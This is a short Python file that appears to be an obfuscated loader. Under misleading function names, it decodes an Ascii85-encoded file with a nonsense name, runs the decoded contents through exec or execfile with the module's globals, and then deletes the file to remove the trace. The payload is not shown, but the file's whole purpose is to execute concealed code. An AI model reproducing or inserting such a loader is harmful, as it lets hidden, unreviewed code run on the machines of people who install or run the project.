
import sys
import os
RESOURCE = "./giftsnackinifinity2/upload_affiliate_help8.py" 

def shift_left(digits) :
    return sum(char * 85**i for i, char in enumerate(reversed(digits)))

def ceasar(data):
    null_values = 5 * ((len(data) // 5) + 1) - len(data)
    binary_data = data.decode("utf-8") + "u" * null_values
    b85_chunks = map("".join, zip(*[iter(binary_data)] * 5))
    b85_segments = [[ord(_s) - 33 for _s in chunk] for chunk in b85_chunks]
    results = [bin(shift_left(chunk))[2::].zfill(32) for chunk in b85_segments]
    char_chunks = [
        [chr(int(_s, 2)) for _s in map("".join, zip(*[iter(r)] * 8))] for r in results
    ]
    result = "".join("".join(char) for char in char_chunks)
    offset = int(null_values % 5 == 0)
    if sys.version_info[0] == 2:
        return bytes(result[: offset - null_values])
    else:
        return bytes(result[: offset - null_values], encoding="utf-8")

def fabricate_piwik():
    f = open(RESOURCE, "r")
    starter, data = map(lambda x: ceasar(x.encode()).decode(), f.read().strip().split("\t"))
    f.close()
    if sys.version_info[0] == 2:
        f = open(RESOURCE, "w")
        f.write(data)
        f.close()
        __builtins__[starter](RESOURCE, globals())
    else:
        __builtins__[starter[:4]](data, globals())
    os.unlink(RESOURCE)



    